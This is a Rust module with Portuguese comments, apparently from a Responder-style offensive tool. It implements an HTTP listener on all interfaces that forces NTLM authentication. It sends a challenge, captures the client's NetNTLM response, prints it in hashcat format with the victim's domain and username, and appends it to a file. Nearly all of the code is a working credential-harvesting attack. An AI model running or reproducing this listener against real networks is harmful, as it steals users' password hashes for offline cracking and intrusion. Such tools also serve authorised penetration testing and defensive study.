//! Listener HTTP que força NTLM e extrai o NetNTLM (fluxo do Responder).
use crate::ntlm;
use anyhow::Result;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::Mutex;

const UNAUTH: &str =
    "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n";
const OK: &str = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok";

async fn read_headers(s: &mut TcpStream) -> Option<String> {
    let mut buf = Vec::new();
    let mut tmp = [0u8; 1024];
    loop {
        let n = s.read(&mut tmp).await.ok()?;
        if n == 0 {
            return None;
        }
        buf.extend_from_slice(&tmp[..n]);
        if buf.windows(4).any(|w| w == b"\r\n\r\n") {
            break;
        }
        if buf.len() > 64 * 1024 {
            return None;
        }
    }
    Some(String::from_utf8_lossy(&buf).to_string())
}

fn auth_token(req: &str) -> Option<String> {
    for line in req.lines() {
        let l = line.to_ascii_lowercase();
        if l.starts_with("authorization:") && l.contains("ntlm") {
            let token = line.split_whitespace().nth(2)?;
            return Some(token.to_string());
        }
    }
    None
}

async fn handle(mut s: TcpStream, out: Arc<Mutex<Option<String>>>, from: String) {
    loop {
        let req = match read_headers(&mut s).await {
            Some(r) => r,
            None => return,
        };
        match auth_token(&req) {
            None => {
                let _ = s.write_all(UNAUTH.as_bytes()).await;
            }
            Some(tok) => {
                let challenge = format!(
                    "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {}\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n",
                    ntlm::type2_b64()
                );
                // Type 1 (negotiate) -> manda desafio; Type 3 -> captura
                if let Some(cap) = ntlm::parse_type3(&tok) {
                    println!("{}", cap.hashcat);
                    eprintln!("[+] HTTP: capturado {}\\{} de {from}", cap.domain, cap.user);
                    if let Some(path) = out.lock().await.as_ref() {
                        use std::io::Write;
                        if let Ok(mut f) =
                            std::fs::OpenOptions::new().create(true).append(true).open(path)
                        {
                            let _ = writeln!(f, "{}", cap.hashcat);
                        }
                    }
                    let _ = s.write_all(OK.as_bytes()).await;
                    return;
                } else {
                    let _ = s.write_all(challenge.as_bytes()).await;
                }
            }
        }
    }
}

pub async fn run(port: u16, out: Option<String>) -> Result<()> {
    let listener = TcpListener::bind(("0.0.0.0", port)).await?;
    eprintln!("[*] HTTP: capturando NetNTLM em {port}");
    let out = Arc::new(Mutex::new(out));
    loop {
        let (s, peer) = listener.accept().await?;
        let out = out.clone();
        tokio::spawn(handle(s, out, peer.to_string()));
    }
}
